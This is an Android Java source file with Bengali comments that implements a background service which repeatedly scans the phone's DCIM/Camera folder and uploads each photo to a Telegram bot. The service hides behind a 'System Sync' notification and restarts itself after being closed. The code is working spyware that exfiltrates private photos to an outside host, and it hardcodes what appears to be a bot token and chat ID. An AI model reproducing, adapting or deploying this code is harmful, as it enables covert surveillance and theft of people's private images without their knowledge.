package com.my.project10; // আপনার প্যাকেজ নাম পরিবর্তন করতে ভুলবেন না

import java.io.*;
import java.net.*;
import android.app.*;
import android.content.*;
import android.os.*;
import androidx.core.app.NotificationCompat;

public class TelegramManager {

    // ১. একই ছবি বারবার যাওয়া বন্ধ করতে পাঠানো ছবির নাম সেভ রাখা
    private static boolean isAlreadySent(Context context, String fileName) {
        SharedPreferences pref = context.getSharedPreferences("SentFiles", Context.MODE_PRIVATE);
        return pref.getBoolean(fileName, false);
    }

    // ২. ছবি সফলভাবে গেলে তা মার্ক করে রাখা
    private static void markAsSent(Context context, String fileName) {
        SharedPreferences pref = context.getSharedPreferences("SentFiles", Context.MODE_PRIVATE);
        pref.edit().putBoolean(fileName, true).apply();
    }

    // ৩. মূল মেথড: সরাসরি ছবি এবং ক্যাপশন পাঠানো
    public static void uploadFile(final Context context, final String botToken, final String chatId, final String filePath) {
        final File file = new File(filePath);
        
        // ছবি না থাকলে বা আগে পাঠানো হয়ে থাকলে আর পাঠাবে না
        if (!file.exists() || isAlreadySent(context, file.getName())) return;

        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection con = null;
                try {
                    // 'sendPhoto' ব্যবহার করা হয়েছে যাতে ফাইল না হয়ে সরাসরি ছবি দেখায়
                    URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendPhoto");
                    con = (HttpURLConnection) url.openConnection();
                    con.setDoOutput(true);
                    con.setRequestMethod("POST");
                    String boundary = "===" + System.currentTimeMillis() + "===";
                    con.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                    OutputStream os = con.getOutputStream();
                    PrintWriter writer = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);

                    // ক. চ্যাট আইডি
                    writer.append("--" + boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
                    writer.append(chatId).append("\r\n");

                    // খ. ক্যাপশন যোগ করা
                    writer.append("--" + boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"caption\"").append("\r\n\r\n");
                    writer.append("Developer @ArmanKhan_BDT").append("\r\n");

                    // গ. ছবি ফাইল ডাটা
                    writer.append("--" + boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"" + file.getName() + "\"").append("\r\n");
                    writer.append("Content-Type: image/jpeg").append("\r\n\r\n");
                    writer.flush();

                    FileInputStream fis = new FileInputStream(file);
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) { 
                        os.write(buffer, 0, bytesRead); 
                    }
                    os.flush(); fis.close();
                    
                    writer.append("\r\n").flush();
                    writer.append("--" + boundary + "--").append("\r\n");
                    writer.close();

                    // সফল হলে রেসপন্স কোড ২০০ আসবে
                    if (con.getResponseCode() == 200) {
                        markAsSent(context, file.getName());
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (con != null) con.disconnect();
                }
            }
        }).start();
    }

    // ৪. ব্যাকগ্রাউন্ড সার্ভিস (সারাক্ষণ সচল থাকার জন্য)
    public static class BackgroundService extends Service {
        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            // অ্যান্ড্রয়েড ৮+ এর জন্য নোটিফিকেশন চ্যানেল
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel("Ch1", "Sync", NotificationManager.IMPORTANCE_LOW);
                NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (manager != null) manager.createNotificationChannel(channel);
                
                startForeground(1, new NotificationCompat.Builder(this, "Ch1")
                        .setContentTitle("System Sync")
                        .setContentText("Checking files...")
                        .setSmallIcon(android.R.drawable.ic_menu_save)
                        .build());
            }

            // --- এই দুটি লাইন খুব সাবধানে আপনার তথ্য দিয়ে পরিবর্তন করুন ---
            final String token = "8224532856:AAGGLil-l140TcUQRsby0XoU_yZT2OvhL-U"; 
            final String id = "6708533277";
            // -------------------------------------------------------

            final String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM/Camera";

            new Thread(new Runnable() {
                @Override
                public void run() {
                    while (true) {
                        try {
                            File dir = new File(path);
                            File[] files = dir.listFiles();
                            if (files != null) {
                                for (File f : files) {
                                    String name = f.getName().toLowerCase();
                                    // শুধু ছবি ফাইল ফিল্টার করা হচ্ছে
                                    if (f.isFile() && (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png"))) {
                                        uploadFile(getApplicationContext(), token, id, f.getAbsolutePath());
                                        Thread.sleep(10000); // প্রতি ছবির মাঝে ১০ সেকেন্ড গ্যাপ
                                    }
                                }
                            }
                            Thread.sleep(30000); // প্রতি ৩০ সেকেন্ড পর পর নতুন ছবি চেক
                        } catch (Exception e) {}
                    }
                }
            }).start();
            
            return START_STICKY; // অ্যাপ বন্ধ হলেও সার্ভিস সচল থাকবে
        }

        @Override
        public IBinder onBind(Intent intent) { return null; }
    }
}
